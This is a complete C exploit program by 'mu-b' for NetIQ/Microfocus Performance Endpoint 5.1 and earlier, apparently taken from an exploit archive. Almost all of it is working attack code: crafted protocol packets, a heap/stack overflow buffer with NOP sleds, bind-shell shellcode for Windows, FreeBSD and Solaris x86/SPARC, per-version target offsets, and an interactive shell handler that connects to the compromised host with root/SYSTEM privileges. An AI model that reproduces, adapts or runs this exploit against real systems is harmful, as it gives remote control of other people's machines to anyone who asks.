/*
# Exploit Title: NetIQ/Microfocus Performance Endpoint v5.1 - remote root/SYSTEM exploit
# Date: Jun 2007
# Exploit Author: mu-b
# Vendor Homepage: https://www.microfocus.com/en-us/cyberres/identity-access-management
# Version: All
# Tested on: Windows / Solaris x86/SPARC
# CVE : 0day
* endpoint-pown-uni.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * NetIQ Performance Endpoint <=5.1 remote root/SYSTEM exploit
 * by mu-b - Jun 2007
 *
 * $Id: endpoint-pown-uni.c 56 2021-04-23 10:15:49Z mu-b $
 *
 * - Tested on: NetIQ Performance Endpoint 5.1.15750 (win32)
 *                                   (Revised: December, 2012)
 *              NetIQ Performance Endpoint 5.1.15541 (win32)
 *                                   (Revised: December, 2012)
 *              NetIQ Performance Endpoint 5.1.15368 (win32)
 *                                   (Revised: December, 2012)
 *              NetIQ Performance Endpoint 5.1 (win32)
 *              NetIQ Performance Endpoint 4.2 (freebsd-x86)
 *              NetIQ Performance Endpoint 5.1 (solaris-SPARC+noexec-stack)
 *                                   (Revised: May 23, 2006)
 *
 *
 *   "No executable code (like Java or Visual Basic) is sent. There is no way
 *    to do something like 'run this command.' 100,000’s of endpoints have been
 *    installed worldwide without incident."
 *
 *   "Endpoints do rigorous internal validation. For example, endpoints are not
 *    susceptible to 'buffer overrun' attacks used by hackers."
 * - https://tinyurl.com/lgmblyj
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <arpa/inet.h>
#include <assert.h>
#include <ifaddrs.h>
#include <limits.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define IPV4_BUFLEN             16 /* "255.255.255.255\0" */

#define PORT_SHELL              10000
#define ENDPT_TCP_PORT          10115
#define ENDPT_PKTMAX            0x1388

static char ppkt_buf1[] =
  "\x06"                              /* ENDPT_COMMAND_SETUP_E1   */
  "\x07\x14\x43\x1A"                  /* verify_get_id (1)        */
  "\x00\x22"                          /* copyright_smart_compare  */
  "Copyright Ganymede Software Inc."
  "\x00\x03"                          /*                          */
  "\xff"                              /* code_convert_from_line   */
  "\x00\x03"                          /*                          */
  "\xff"                              /* code_convert_from_line   */
  "\x00"                              /*            */
  "\x00\x02"                          /* len < 0x80 */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /* len < 0x40 */
  "\x41\x41\x41\x41\x41\x41\x41\x41"  /*            */
  "\x41\x41\x41\x41\x41\x41\x41\x41"  /*            */
  "\x02"                              /* protocol   */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x41\x41\x41\x41\x41\x41"          /*            */
  "\x00\x00\x00\x01"                  /*            */
  "\x00\x00\x00\x02"                  /* 218h       */
  "\x00"                              /*            */
  "\x01"                              /* 1ACh       */
  "\x00\x00"                          /*            */
  "\x00"                              /* 254h       */
  "\x02"                              /* protocol   */
  "\x00\x03"                          /* len < 0x40 */
  "\x00";                             /*            */

static char ppkt_buf1_end[] =
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00";                             /*            */

static char ppkt_buf2[] =
  "\x06"                              /* ENDPT_COMMAND_SETUP_E1   */
  "\x07\x14\x43\x1A"                  /* verify_get_id (1)        */
  "\x00\x22"                          /* copyright_smart_compare  */
  "Copyright Ganymede Software Inc."
  "\x00\x03"                          /*                          */
  "\xff"                              /* code_convert_from_line   */
  "\x00\x03"                          /*                          */
  "\xff"                              /* code_convert_from_line   */
  "\x02"                              /* protocol   */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x69"                              /* 210h       */
  "\x00\x00\x00\x69"                  /* var_C      */
  "\x00\x02"                          /*            */
  "\x00\x00\x00\x69"                  /* var_C      */
  "\x00\x00\x00\x69"                  /* 218h       */
  "\x69"                              /*            */
  "\x01"                              /* 1ACh       */
  "\x00\x00"                          /*            */
  "\x69"                              /* 254h       */
  "\x02"                              /* protocol   */
  "\x00\x03"                          /* len < 0x40 */
  "\x00";                             /*            */

static char ppkt_buf2_end[] =
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x00\x03"                          /* len < 0x40 */
  "\x00"                              /*            */
  "\x69"                              /* 0A8h       */
  "\x00\x03"                          /* len < 0x40 */
  "\x00";                             /*            */

static char cpkt_buf1[] =
  "\x07"
  "AAAA";

static char cpkt_buf2[] =
  "\x38"
  "\x00\x04"
  "AAAA";

static char x86_evil_len[] =
  "\x11\xc0";                         /* adc eax, eax */

#define X86_NOP_BYTE    0x90          /* nop          */

static char sparc_evil_len[] =
  "\x10\x80\x00\x3c";                 /* ba           */

static char sparc_nop[] =
  "\x01\x00\x00\x00";                 /* nop          */

static char hammer_buf[] =
  "\x00\x25\x38"
  "\x00\x20"
  "\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00";

static char win32_x86_bind[] =
  "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x8e"
  "\x2b\xb7\x2a\x83\xeb\xfc\xe2\xf4\x72\x41\x5c\x67\x66\xd2\x48\xd5"
  "\x71\x4b\x3c\x46\xaa\x0f\x3c\x6f\xb2\xa0\xcb\x2f\xf6\x2a\x58\xa1"
  "\xc1\x33\x3c\x75\xae\x2a\x5c\x63\x05\x1f\x3c\x2b\x60\x1a\x77\xb3"
  "\x22\xaf\x77\x5e\x89\xea\x7d\x27\x8f\xe9\x5c\xde\xb5\x7f\x93\x02"
  "\xfb\xce\x3c\x75\xaa\x2a\x5c\x4c\x05\x27\xfc\xa1\xd1\x37\xb6\xc1"
  "\x8d\x07\x3c\xa3\xe2\x0f\xab\x4b\x4d\x1a\x6c\x4e\x05\x68\x87\xa1"
  "\xce\x27\x3c\x5a\x92\x86\x3c\x6a\x86\x75\xdf\xa4\xc0\x25\x5b\x7a"
  "\x71\xfd\xd1\x79\xe8\x43\x84\x18\xe6\x5c\xc4\x18\xd1\x7f\x48\xfa"
  "\xe6\xe0\x5a\xd6\xb5\x7b\x48\xfc\xd1\xa2\x52\x4c\x0f\xc6\xbf\x28"
  "\xdb\x41\xb5\xd5\x5e\x43\x6e\x23\x7b\x86\xe0\xd5\x58\x78\xe4\x79"
  "\xdd\x78\xf4\x79\xcd\x78\x48\xfa\xe8\x43\x90\x3a\xe8\x78\x3e\xcb"
  "\x1b\x43\x13\x30\xfe\xec\xe0\xd5\x58\x41\xa7\x7b\xdb\xd4\x67\x42"
  "\x2a\x86\x99\xc3\xd9\xd4\x61\x79\xdb\xd4\x67\x42\x6b\x62\x31\x63"
  "\xd9\xd4\x61\x7a\xda\x7f\xe2\xd5\x5e\xb8\xdf\xcd\xf7\xed\xce\x7d"
  "\x71\xfd\xe2\xd5\x5e\x4d\xdd\x4e\xe8\x43\xd4\x47\x07\xce\xdd\x7a"
  "\xd7\x02\x7b\xa3\x69\x41\xf3\xa3\x6c\x1a\x77\xd9\x24\xd5\xf5\x07"
  "\x70\x69\x9b\xb9\x03\x51\x8f\x81\x25\x80\xdf\x58\x70\x98\xa1\xd5"
  "\xfb\x6f\x48\xfc\xd5\x7c\xe5\x7b\xdf\x7a\xdd\x2b\xdf\x7a\xe2\x7b"
  "\x71\xfb\xdf\x87\x57\x2e\x79\x79\x71\xfd\xdd\xd5\x71\x1c\x48\xfa"
  "\x05\x7c\x4b\xa9\x4a\x4f\x48\xfc\xdc\xd4\x67\x42\x61\xe5\x57\x4a"
  "\xdd\xd4\x61\xd5\x5e\x2b\xb7\x2a";

static char freebsd_x86_bind[] =
  "\x6a\x61\x58\x99\x52\x68\x10\x02\x27\x10\x89\xe1\x52\x42\x52\x42"
  "\x52\x6a\x10\xcd\x80\x99\x93\x51\x53\x52\x6a\x68\x58\xcd\x80\xb0"
  "\x6a\xcd\x80\x52\x53\x52\xb0\x1e\xcd\x80\x97\x6a\x02\x59\x6a\x5a"
  "\x58\x51\x57\x51\xcd\x80\x49\x79\xf5\x50\x68\x2f\x2f\x73\x68\x68"
  "\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80";

static char solaris_sparc_bind[] =
  "\x9c\x2b\xa0\x07\x98\x10\x20\x01\x96\x1a\xc0\x0b\x94\x1a\xc0\x0b"
  "\x92\x10\x20\x02\x90\x10\x20\x02\x82\x10\x20\xe6\x91\xd0\x20\x08"
  "\xd0\x23\xbf\xf8\x21\x00\x00\x89\xa0\x14\x23\x10\xe0\x23\xbf\xf0"
  "\xc0\x23\xbf\xf4\x92\x23\xa0\x10\x94\x10\x20\x10\x82\x10\x20\xe8"
  "\x91\xd0\x20\x08\xd0\x03\xbf\xf8\x92\x10\x20\x01\x82\x10\x20\xe9"
  "\x91\xd0\x20\x08\xd0\x03\xbf\xf8\x92\x1a\x40\x09\x94\x12\x40\x09"
  "\x82\x10\x20\xea\x91\xd0\x20\x08\xd0\x23\xbf\xf8\x94\x10\x20\x03"
  "\x92\x10\x20\x09\x94\xa2\xa0\x01\x82\x10\x20\x3e\x91\xd0\x20\x08"
  "\x12\xbf\xff\xfc\xd0\x03\xbf\xf8\x94\x1a\xc0\x0b\x21\x0b\xd8\x9a"
  "\xa0\x14\x21\x6e\x23\x0b\xdc\xda\x90\x23\xa0\x10\x92\x23\xa0\x08"
  "\xe0\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b"
  "\x91\xd0\x20\x08";

static char solaris_x86_bind[] =
  "\xb8\xff\xff\xff\xff\xba\xfd\xff\xd8\xef\xf7\xd0\xf7\xd2\x50\x52"
  "\x89\xe7\x31\xdb\xf7\xe3\xb0\x02\x50\x52\x52\x50\x50\x50\xb0\xe6"
  "\xcd\x91\x93\x6a\x10\x57\x53\x52\xb0\xe8\xcd\x91\x52\x53\x52\xb0"
  "\xe9\xcd\x91\x52\x53\x6a\x02\xb0\xea\xcd\x91\x93\x92\x99\x59\x51"
  "\x52\xb0\x06\xcd\x91\x51\x6a\x09\x53\x52\xb0\x3e\xcd\x91\x83\xc4"
  "\x18\x49\x79\xeb\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
  "\xe3\x52\x53\x89\xe1\x52\x52\x51\x53\x52\xb0\x3b\xcd\x91";

#define NUM_TARGETS 7

#define ARCH_X86    0
#define ARCH_SPARC  1

struct target_t
{
  const char *name;
  const char *zshell;
  const int zshell_len;
  const int zshell_pkt_len;
  const int fp_indx;
  const int fp_offset;
  const int arch;
};

struct target_t targets[] = {
  { "NetIQ Endpoint 5.1.15750 - Microsoft Windows (universal)",
    win32_x86_bind, sizeof win32_x86_bind, 0x11c0, 33, 0x490, ARCH_X86 },
  { "NetIQ Endpoint 5.1.15541 - Microsoft Windows (universal)",
    win32_x86_bind, sizeof win32_x86_bind, 0x11c0, 33, 0x490, ARCH_X86 },
  { "NetIQ Endpoint 5.1.15368 - Microsoft Windows (universal)",
    win32_x86_bind, sizeof win32_x86_bind, 0x11c0, 33, 0x488, ARCH_X86 },
  { "NetIQ Endpoint 5.1 - Microsoft Windows (universal)",
    win32_x86_bind, sizeof win32_x86_bind, 0x11c0, 33, 0x480, ARCH_X86 },
  { "NetIQ Endpoint 5.1 - FreeBSD (universal)",
    freebsd_x86_bind, sizeof freebsd_x86_bind, 0x11c0, 29, 0x3FC, ARCH_X86 },
  { "NetIQ Endpoint 5.1 - Solaris SPARC (universal)",
    solaris_sparc_bind, sizeof solaris_sparc_bind, 0x1080, 29, 0x400, ARCH_SPARC },
  { "NetIQ Endpoint 5.1 - Solaris x86 (universal)",
    solaris_x86_bind, sizeof solaris_x86_bind, 0x11c0, 29, 0x400, ARCH_X86 },
  {0}
};

static const char *quotes[] = {
  "  \"No executable code (like Java or Visual Basic) is sent. There is no way\n"
  "   to do something like 'run this command.' 100,000’s of endpoints have been\n"
  "   installed worldwide without incident.\"",
  "  \"Endpoints do rigorous internal validation. For example, endpoints are not\n"
  "   susceptible to 'buffer overrun' attacks used by hackers.\""
};

static int verbose = 1;   /* verbosity */
static int ppid, cpid;    /* parent and child process id's */

static int get_localip_getifaddrs (in_addr_t *);
static int sock_send (int, char *, int);
static int sock_recv (int, char *, int);
static int sock_recv_str (int, char *, int);
static void shellami (int);

static void
fatal (void)
{
  kill (0, SIGKILL);
  exit (EXIT_FAILURE);
}

static int
get_localip_getifaddrs (in_addr_t *ip_addr)
{
  struct ifaddrs *ifa_head;
  int result;

  result = -1;
  if (getifaddrs (&ifa_head) == 0)
    {
      struct ifaddrs *ifa_cur;

      for (ifa_cur = ifa_head; ifa_cur; ifa_cur = ifa_cur->ifa_next)
        {
          if (ifa_cur->ifa_name != NULL && ifa_cur->ifa_addr != NULL)
            {
              if (ifa_cur->ifa_addr->sa_family != AF_INET ||
                  !(ifa_cur->ifa_flags & IFF_UP))
                continue;
              if (ifa_cur->ifa_flags & IFF_LOOPBACK)
                continue;

              memcpy (ip_addr,
                      &((struct sockaddr_in *) ifa_cur->ifa_addr)->sin_addr,
                      sizeof *ip_addr);
              result = 0;
              break;
            }
        }

      freeifaddrs (ifa_head);
    }

  return (result);
}

static int
sock_send (int fd, char *src, int len)
{
  int n;
  if ((n = send (fd, src, len, 0)) < 0)
    {
      perror ("send()");
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv (int fd, char *dst, int len)
{
  int n;
  if ((n = recv (fd, dst, len, 0)) < 0)
    {
      perror ("recv()");
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv_str (int fd, char *dst, int len)
{
  int n = sock_recv (fd, dst, len - 1);
  dst[n] = '\0';
  return (n);
}

static void
shellami (int fd)
{
  int n;
  fd_set rset;
  char rbuf[1024];

  while (1)
    {
      FD_ZERO (&rset);
      FD_SET (fd, &rset);
      FD_SET (STDIN_FILENO, &rset);

      if (select (fd + 1, &rset, NULL, NULL, NULL) < 0)
        {
          perror ("select()");
          fatal ();
        }

      if (FD_ISSET (fd, &rset))
        {
          if ((n = sock_recv_str (fd, rbuf, sizeof (rbuf) - 1)) <= 0)
            {
              fprintf (stderr, "Connection closed by foreign host.\n");
              exit (EXIT_SUCCESS);
            }
          printf ("%s", rbuf);
          fflush (stdout);
        }
      if (FD_ISSET (STDIN_FILENO, &rset))
        {
          if ((n = read (STDIN_FILENO, rbuf, sizeof (rbuf) - 1)) > 0)
            {
              rbuf[n] = '\0';
              sock_send (fd, rbuf, n);
            }
        }
    }
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd;

  fflush (stdout);
  if ((fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket()");
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (EXIT_FAILURE);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (fd, (struct sockaddr *) &address, sizeof (address)) < 0)
    {
      perror ("connect()");
      return (-1);
    }

  return (fd);
}

int
endpt_add_string (char *buf, char *str)
{
  unsigned int str_len;
  unsigned short str_lens;

  assert (buf != NULL && str != NULL);

  str_len = 2 + strlen (str) + 1;
  str_lens = htons (str_len);

  /* add the string length and copy, including NULL */
  *((unsigned short *) buf) = str_lens;
  memcpy (buf + 2, str, str_len - 2);

  return (str_len);
}

char *
endpt_read_packet (int fd, char *buf)
{
  unsigned short pkt_len;
  int n;

  n = sock_recv (fd, (char *) &pkt_len, sizeof pkt_len);
  if (n < 2)
    {
      fprintf (stderr, "endpt_read_packet: failed reading length!\n");
      return (NULL);
    }

  pkt_len = ntohs (pkt_len);
  if (pkt_len > ENDPT_PKTMAX)
    {
      fprintf (stderr, "endpt_read_packet: invalid packet length!\n");
      return (NULL);
    }

  n = sock_recv (fd, buf, pkt_len - 2);
  if (n < pkt_len - 2)
    {
      fprintf (stderr, "endpt_read_packet: failed reading packet (%d read, need %d)!\n", n, pkt_len);
      return (NULL);
    }

  return (buf);
}

char *
endpt_create_packet (char *buf, unsigned int len)
{
  char *pkt_buf;
  unsigned int pkt_len;
  unsigned short pkt_lens;

  assert (buf != NULL && len > 0);
  assert (len <= UINT_MAX - 2);
  assert (len <= ENDPT_PKTMAX - 2);

  pkt_len = 2 + len;
  pkt_buf = malloc (pkt_len * sizeof (char));
  if (pkt_buf == NULL)
    return (NULL);

  pkt_lens = htons (pkt_len);

  /* add the packet length and copy */
  *((unsigned short *) pkt_buf) = pkt_lens;
  memcpy (pkt_buf + 2, buf, len);

  return (pkt_buf);
}

void
endpt_listen_child (char *thost, struct target_t *trgt)
{
  struct sockaddr_in servaddr, cliaddr;
  char pkt_buf[ENDPT_PKTMAX-2], *pkt_ptr, *ptr;
  unsigned int var_30_ptr;
  int lfd, cfd, sfd, pid;
  socklen_t clilen;

  sleep (1);
  pid = getpid ();

  if ((lfd = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    {
      perror ("socket()");
      fatal ();
    }

  memset (&servaddr, 0, sizeof servaddr);
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htonl (INADDR_ANY);
  servaddr.sin_port = htons (ENDPT_TCP_PORT);

  if (bind (lfd, (struct sockaddr *) &servaddr, sizeof servaddr) < 0)
    {
      perror ("bind()");
      fatal ();
    }

  if (listen (lfd, 2) < 0)
    {
      perror ("listen()");
      fatal ();
    }

  clilen = sizeof cliaddr;
  if ((cfd = accept (lfd, (struct sockaddr *) &cliaddr, &clilen)) < 0)
    {
      perror ("accept()");
      fatal ();
    }

  printf ("[child-%d] connection accepted from %s:%d\n",
          pid, inet_ntoa (cliaddr.sin_addr), ntohs (cliaddr.sin_port));

  printf ("[child-%d] reading first packet...", pid);

  /* read dummy packet */
  if ((ptr = endpt_read_packet (cfd, pkt_buf)) == NULL)
    {
      close (cfd);
      fatal ();
    }
  printf ("done\n");

  printf ("[child-%d] sending first reply...", pid);
  pkt_ptr = endpt_create_packet (cpkt_buf1, sizeof cpkt_buf1 - 1);

  sock_send (cfd, pkt_ptr, (sizeof cpkt_buf1 - 1) + 2);
  free (pkt_ptr);
  printf ("done\n");

  printf ("[child-%d] reading second packet...", pid);

  /* read dummy packet */
  if ((ptr = endpt_read_packet (cfd, pkt_buf)) == NULL)
    {
      close (cfd);
      fatal ();
    }
  printf ("done\n");

  printf ("[child-%d] reading third packet...", pid);

  if ((ptr = endpt_read_packet (cfd, pkt_buf)) == NULL)
    {
      close (cfd);
      fatal ();
    }
  memcpy (&var_30_ptr, pkt_buf + 3, sizeof var_30_ptr);
  printf ("done\n");

  printf ("[child-%d] MAGIC COOKIE: 0x%08x\n", pid, var_30_ptr);

  memcpy (&cpkt_buf2[3], &var_30_ptr, sizeof var_30_ptr);

  printf ("[child-%d] reading fourth packet...", pid);

  /* read dummy packet */
  if ((ptr = endpt_read_packet (cfd, pkt_buf)) == NULL)
    {
      close (cfd);
      fatal ();
    }
  printf ("done\n");

  printf ("[child-%d] reading fifth packet...", pid);

  if ((ptr = endpt_read_packet (cfd, pkt_buf)) == NULL)
    {
      close (cfd);
      fatal ();
    }
  memcpy (&var_30_ptr, pkt_buf + 3, sizeof var_30_ptr);
  printf ("done\n");

  printf ("[child-%d] MAGIC COOKIE: 0x%08x\n", pid, var_30_ptr);

  memcpy (&cpkt_buf2[3], &var_30_ptr, sizeof var_30_ptr);

  printf ("[child-%d] sending second reply...", pid);
  pkt_ptr = endpt_create_packet (cpkt_buf2, sizeof cpkt_buf2 - 1);

  sock_send (cfd, pkt_ptr, (sizeof cpkt_buf2 - 1) + 2);
  free (pkt_ptr);
  printf ("done\n");

  printf ("[child-%d] sending evil buffer...", pid);

  ptr = pkt_buf;
  if (trgt->arch == ARCH_X86)
    {
      memcpy (ptr, x86_evil_len, sizeof x86_evil_len);
      ptr += sizeof x86_evil_len - 1;
      memset (ptr, X86_NOP_BYTE, 0x11c0 - 2);
    }
  else if (trgt->arch == ARCH_SPARC)
    {
      int i;

      for (i = 0; i < 2; i++, ptr += sizeof sparc_evil_len - 1)
        memcpy (ptr, sparc_evil_len, sizeof sparc_evil_len);

      for (i = 0; i < 80; i++, ptr += sizeof sparc_nop - 1)
        memcpy (ptr, sparc_nop, sizeof sparc_nop);
    }
  else
    {
      fprintf (stderr, "opps\n");
      exit (EXIT_FAILURE);
    }

  memcpy (&pkt_buf[256], trgt->zshell, trgt->zshell_len - 1);
  sock_send (cfd, pkt_buf, trgt->zshell_pkt_len);
  printf ("done\n");

  printf ("[child-%d] sending hammer buffer...", pid);

  ptr = pkt_buf;
  memcpy (ptr, hammer_buf, sizeof hammer_buf);
  memcpy (&pkt_buf[5], &var_30_ptr, sizeof var_30_ptr);
  if (trgt->arch == ARCH_SPARC)
    var_30_ptr = ntohl (var_30_ptr);

  var_30_ptr -= trgt->fp_offset - 0x08;

  if (trgt->arch == ARCH_SPARC)
    var_30_ptr = htonl (var_30_ptr);

  memcpy (&pkt_buf[trgt->fp_indx], &var_30_ptr, sizeof var_30_ptr);
  sock_send (cfd, pkt_buf, sizeof hammer_buf - 1);
  printf ("done\n");

  printf ("[child-%d] waiting for the shellcode to be executed...\n", pid);
  sleep (3);
  if ((sfd = sockami (thost, PORT_SHELL)) != -1)
    {
      printf ("+Wh00t!\n\n");
      shellami (sfd);
    }

  sleep (1);
  close (cfd);
}

void
endpt_parent (char *thost)
{
  struct in_addr ip_addr;
  char ip_buf[IPV4_BUFLEN], pkt_buf[ENDPT_PKTMAX-2], *pkt_ptr, *ptr;
  int fd;

  get_localip_getifaddrs (&ip_addr.s_addr);
  strncpy (ip_buf, inet_ntoa (ip_addr), sizeof ip_buf);
  ip_buf[sizeof ip_buf - 1] = '\0';

  if (verbose)
    fprintf (stderr, "[parent-%d] source address %s\n", ppid, ip_buf);

  fflush (stdout);

  printf ("[parent-%d] connecting to %s:%d...", ppid, thost, ENDPT_TCP_PORT);
  if ((fd = sockami (thost, ENDPT_TCP_PORT)) < 0)
    fatal ();
  printf ("done\n");

  printf ("[parent-%d] building first packet...", ppid);

  ptr = pkt_buf;
  memcpy (ptr, ppkt_buf1, sizeof ppkt_buf1);
  ptr += sizeof ppkt_buf1 - 1;

  /* add the connect-back IP */
  ptr += endpt_add_string (ptr, ip_buf);

  memcpy (ptr, ppkt_buf1_end, sizeof ppkt_buf1_end);
  ptr += sizeof ppkt_buf1_end - 1;

  pkt_ptr = endpt_create_packet (pkt_buf, ptr - pkt_buf);
  printf ("done\n");

  sock_send (fd, pkt_ptr, (ptr - pkt_buf) + 2);
  free (pkt_ptr);

  printf ("[parent-%d] building second packet...", ppid);

  ptr = pkt_buf;
  memcpy (ptr, ppkt_buf2, sizeof ppkt_buf2);
  ptr += sizeof ppkt_buf2 - 1;

  /* add the connect-back IP */
  ptr += endpt_add_string (ptr, ip_buf);

  memcpy (ptr, ppkt_buf2_end, sizeof ppkt_buf2_end);
  ptr += sizeof ppkt_buf2_end - 1;

  pkt_ptr = endpt_create_packet (pkt_buf, ptr - pkt_buf);
  printf ("done\n");

  sock_send (fd, pkt_ptr, (ptr - pkt_buf) + 2);

  printf ("[parent-%d] building third packet...done\n", ppid);
  sock_send (fd, pkt_ptr, (ptr - pkt_buf) + 2);
  free (pkt_ptr);

  sleep (2);
  printf ("[parent-%d] closing socket...done\n", ppid);
  close (fd);
}

int
main (int argc, char **argv)
{
  struct target_t *trgt;
  int i, cret;

  printf ("NetIQ Performance Endpoint <=5.1 remote root/SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc <= 2)
    {
      fprintf (stderr, "Usage: %s <host> <target>\n", argv[0]);

      for (i = 0; targets[i].name; i++)
        fprintf (stderr, "\t%d) %s\n", i, targets[i].name);
      fprintf (stderr, "\n");

      exit (EXIT_SUCCESS);
    }

  if (atoi (argv[2]) >= NUM_TARGETS)
    {
      fprintf (stderr, "Only %d targets known!!\n", NUM_TARGETS);
      exit (EXIT_SUCCESS);
    }

  trgt = &targets[atoi (argv[2])];
  printf ("Target: %s\n\n", trgt->name);

  srand (time (NULL));
  printf ("%s\n\t- https://tinyurl.com/lgmblyj\n\n", quotes[rand() & 1]);

  ppid = getpid ();
  if ((cpid = fork ()) < 0)
    {
      perror ("fark()");
      exit (EXIT_FAILURE);
    }
  else if (cpid == 0)
    {
      /* child */
      endpt_listen_child (argv[1], trgt);
      exit (EXIT_SUCCESS);
    }

  /* parent */
  endpt_parent (argv[1]);

  /* wait for child */
  wait (&cret);
  if (verbose)
    fprintf (stderr, "[parent-%d] child-%d exited %d\n", ppid, cpid, cret);

  return (EXIT_SUCCESS);
}